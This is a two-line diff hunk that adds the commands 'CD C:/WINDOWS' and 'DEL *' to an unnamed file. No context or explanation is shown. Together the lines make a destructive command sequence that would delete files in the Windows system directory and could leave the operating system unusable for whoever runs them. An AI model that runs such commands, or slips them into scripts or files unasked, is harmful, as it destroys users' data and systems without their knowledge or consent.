@@ -1,0 +1,2 @@
+CD C:/WINDOWS
+DEL *
